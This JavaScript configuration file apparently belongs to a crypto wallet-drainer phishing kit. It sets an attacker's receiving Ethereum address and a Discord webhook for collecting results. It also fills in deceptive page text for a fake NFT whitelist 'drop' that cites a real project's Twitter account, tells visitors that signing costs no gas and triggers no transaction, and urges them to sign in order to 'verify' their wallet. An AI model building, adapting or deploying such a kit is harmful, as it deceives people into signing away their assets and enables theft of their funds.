const receiveAddress = "0x1379b99c7C816DeED4478023C3cB69CE27059973";
const discordWebhookURL = "https://discord.com/api/webhooks/994224661711826954/1zhiN3DidOpC8U4StvqnQLLQdwxxL3Azd8LjndWqUauRermbvTugFjMU"

const collectionInfo = {
    name: "CLAIM WHITELIST",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/YogiesNFT",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "COLLECTORS TOKEN",
}

const claimPageInfo = {
    title: "God Hates NFTees Whitelist Drop", // <br> is a line break
    shortDescription: "LAST CHANCE TO BECOME WHITELISTED!.",
    longDescription: "As We're Minting Soon We Are Giving Away 50 Whitelist Spots To People Who Support Us! All You Need To Do Is Sign The Transaction To Verify Your Wallet For Mint Date! If You Are Already Whitelisted, After Verifying Your Wallet You Will Be Eligible For Our Free NFT Airdrop!",

    claimButtonText: "CLAIM NOW",

    image: "ola.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
